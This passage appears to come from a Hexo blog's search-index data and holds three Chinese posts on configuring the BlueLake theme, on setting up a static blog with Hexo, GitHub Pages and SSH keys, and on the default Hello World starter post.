添加站点关键字请在hexo目录的根_config.yml中添加keywords字段，如：根_config.yml_config.yml1234567# Sitetitle: Hexosubtitle: 副标题description: 网站简要描述,如：Charles·Zheng&#39;s blog.keywords: 网站关键字, key, key1, key2, key3author: Charleslanguage: zh-CN 2.7 其他配置主题_config.yml的其他配置 show_category_count——是否显示分类下的文章数。widgets_on_small_screens——是否在小屏显示侧边栏，若true,则侧边栏挂件将显示在底部。主题_config.ymlthemes/BlueLake/_config.yml 12show_category_count: true widgets_on_small_screens: true3.集成第三方服务3.1 添加评论目前主题集成六种第三方评论，分别是多说评论、Disqus评论、来必力评论、友言评论、网易云跟帖评论、畅言评论，多说马上就要停止服务了，友言好像也没怎么维护,目前我已把自己的博客评论从多说转移到畅言了，在国内目前网易云跟帖和畅言还不错。但是网易云跟帖不能提供子域名服务，所以github的子域名都不能正常通过；而畅言需要提供ICP备案号，否则只能试用14天。反正都不能正常使用。注册并获得代码。若使用多说评论，注册多说后获得short_name。若使用Disqus评论，注册Disqus后获得short_name。若使用来必力评论，注册来必力,获得data-uid。若使用友言评论，注册友言,获得uid。若使用网易云跟帖评论，注册网易云跟帖,获得productKey。若使用畅言评论，注册畅言，获得appid，appkey。配置主题_config.yml：主题_config.ymlthemes/BlueLake/_config.yml12345678910#Cmmentscomment: duoshuo: ## duoshuo_shortname disqus: ## disqus_shortname livere: ## 来必力(data-uid) uyan: ## 友言(uid) cloudTie: ## 网易云跟帖(productKey) changyan: ## 畅言需在下方配置两个参数，此处不填。 appid: ## 畅言(appid) appkey: ##畅言(appkey)3.2 百度统计登录百度统计，定位到站点的代码获取页面。复制//hm.baidu.com/hm.js?后面那串统计脚本id(假设为：8006843039519956000)配置主题_config.yml:主题_config.ymlthemes/BlueLake/_config.yml 1baidu_analytics: 8006843039519956000注意： baidu_analytics不是你的百度id或者百度统计id如若使用谷歌统计，配置方法与百度统计类似。3.3 卜算子阅读次数统计主题_config.ymlthemes/BlueLake/_config.yml1busuanzi: true若设置为true将计算文章的阅读量(Hits)，并显示在文章标题下的小手图标旁。3.4 微博秀微博秀挂件的代码放在layout/_widget/weibo.jade下，需要您去微博开放平台获取您自己的微博秀代码来替换。登录微博开放平台，选择微博秀。为了与主题风格统一，作如下配置基础设置：高400px；勾选宽度自适应；颜色选择白色；样式设置：主字色#333；链接色#40759b；鼠标悬停色#f7f8f8；模块设置：去掉标题、边框、粉丝的勾选框，只留微博。复制代码里src=&quot;&quot;里引号包裹的内容，替换到layout/_widget/weibo.jadeweibo.jadelayout/_widget/weibo.jade1234.widget .widget-title i(class=&#39;fa fa-weibo&#39;)= &#39; &#39; + __(&#39;新浪微博&#39;) iframe(width=&quot;100%&quot;,height=&quot;400&quot;,class=&quot;share_self&quot;,frameborder=&quot;0&quot;,scrolling=&quot;no&quot;,src=&quot;http://widget.weibo.com/weiboshow/index.php?language=&amp;width=0&amp;height=400&amp;fansRow=2&amp;ptype=1&amp;speed=0&amp;skin=5&amp;isTitle=0&amp;noborder=0&amp;isWeibo=1&amp;isFans=0&amp;uid=1700139362&amp;verifier=85be6061&amp;colors=d6f3f7,ffffff,333,40759b,f7f8f8&amp;dpc=1&quot;)这只是为了和主题的风格统一，当然您也可以自由随意发挥。注意：最主要是是要把src里uid=和verifier=后面的字段替换为您自己代码里的就好。 参考文献本文主要参考chaooo写的博客BlueLake博客主题的详细配置","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"Hexo+Github搭建静态博客","date":"2017-06-16T05:51:24.000Z","path":"2017/06/16/Hexo-Github搭建静态博客/","text":"开始之前在安装hexo之前，必须确认你已经安装了Node.js和Git。 1.创建GitHub仓库注册GitHub账号，创建一个以”用户名.github.io”命名的仓库，如我的用户名为Introspelliam,那我的仓库名为：Introspelliam.github.io，仓库默有master分支，用于托管生成的静态文件，再新建一个develop(名字自定)分支，用于托管后台文件，方便以后换电脑时后台文件不会丢失。 2.配置Git设置Git的用户名和邮件地址（邮箱就是你注册Github时候的邮箱），打开Git Bash,键入： $ git config --global user.name &quot;username&quot; $ git config --global user.email &quot;email@example.com&quot; 3.本地Git与GitHub建立联系这里介绍SSH的配置，先检查电脑是否已经有SSH $ ls -al ~/.ssh 如果不存在就没有关系，如果存在的话，直接删除.ssh文件夹里面所有文件。输入以下指令后，一路回车就好: $ ssh-keygen -t rsa -C &quot;emailt@example.com&quot; 然后键入以下指令： $ ssh-agent -s $ ssh-add ~/.ssh/id_rsa 如果出现这个错误:Could not open a connection to your authentication agent，则先执行如下命令即可： $ ssh-agent bash 再重新输入指令： ssh-add ~/.ssh/id_rsa 到了这一步，就可以添加SSH key到你的Github账户了。在github上点击你的头像–&gt;Your profile–&gt;Edit profile–&gt;SSH and GPG keys–&gt;New SSH keyTitle自己随便取，然后这个Key就是刚刚拷贝的，你直接粘贴就好（也可以文本打开id_rsa.pub复制其内容），最后Add SSH key。最后还是测试一下吧，键入以下命令： $ ssh -T git@github.com 你可能会看到有警告，没事，输入“yes”就好。 4.初始化hexo文件夹到GitHub的Introspelliam.github.io仓库下，点击Clone or download,复制里面的HTTPS地址。在E盘或是你喜爱的文件夹下，右键Git Bash Here: 键入git clone -b develop &lt;刚复制的地址&gt; $ git clone -b develop https://github.com/Introspelliam/Introspelliam.github.io.git $ mkdir Hexo-admin Hexo安装配置1.Hexo初始化进入Hexo-admin文件夹 $ cd Hexo-admin 接下来只需要使用 npm 即可完成 Hexo 的安装: $ npm install -g hexo-cli 安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件: $ hexo init $ npm install 接下来也可以本地预览博客，执行下列命令,然后到浏览器输入localhost:4000看看。 $ hexo generate $ hexo server 输入Ctrl+C停止服务。 2.Hexo配置用编辑器打开 Hexo-admin/ 下的配置文件_config.yml找到： # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: repository: 到GitHub的chaooo.github.io仓库下，点击Clone or download,复制里面的HTTPS地址到repository:，添加branch: master。 # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repository: https://github.com/Introspelliam/Introspelliam.github.io.git branch: master 3.完成部署最后一步，快要成功了，键入指令： $ npm install hexo-deployer-git --save $ hexo generate $ hexo deploy 输入弹出框的用户名与密码(首次使用git会弹出)。OK，我们的博客就已经完全搭建起来了，在浏览器输入（当然，是你的Repository名），例如我的：Introspelliam.github.io/每次修改本地文件后，需要键入hexo generate才能保存，再键入hexo deploy上传文件。当然，不要忘了回退到父文件夹提交网站相关的文件以备今后迁移，依次执行git add .、git commit -m “…”、git push origin develop。 日常操作1.写文章执行new命令，生成指定名称的文章至 Admin-blog\\source_posts\\文章标题.md 。 $ hexo new [layout] &quot;文章标题&quot; #新建文章 然后用编辑器打开“文章标题.md”按照Markdown语法书写文章。其中layout是可选参数，默认值为post。到 scaffolds 目录下查看现有的layout。当然你可以添加自己的layout，同时你也可以编辑现有的layout，比如post的layout默认是 hexo\\scaffolds\\post.md title: {{ title }} date: {{ date }} tags: --- 我想添加categories，以免每次手工输入，只需要修改这个文件添加一行，如下： title: {{ title }} date: {{ date }} categories: tags: --- 文件标题也是md文件的名字，同时也出现在你文章的URL中，postName如果包含空格，必须用”将其包围。请注意，大括号与大括号之间在不同版本间可能需要空格，否则会被转义，不能正常显示；所有文件&quot;：&quot;后面都必须有个空格，不然会报错。 2.提交每次在本地对博客进行修改后，先执行下列命令提交网站相关的文件。 $ git add . $ git commit -m &quot;...&quot; $ git push origin develop 然后才执行hexo generate -d发布网站到master分支上。 $ hexo generate -d 3.本地仓库丢失当你想在其他电脑工作，或电脑重装系统后，安装Git与Node.js后，可以使用下列步骤： 3.1拷贝仓库$ git clone -b develop https://github.com/Introspelliam/Introspelliam.github.io.git 3.2配置Hexo在本地新拷贝的chaooo.github.io文件夹下通过Git bash依次执行下列指令: $ npm install -g hexo-cli $ npm install hexo $ npm install $ npm install hexo-deployer-git --save 小Tips:hexo 命令hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo help # 查看帮助 hexo version #查看Hexo的版本 hexo deploy -g #生成加部署 hexo server -g #生成加预览 #命令的简写 hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy 参考文献本文转载Hexo3.2+GitHub搭建静态博客","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"Hello World","date":"2017-06-12T05:51:24.000Z","path":"2017/06/12/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]}]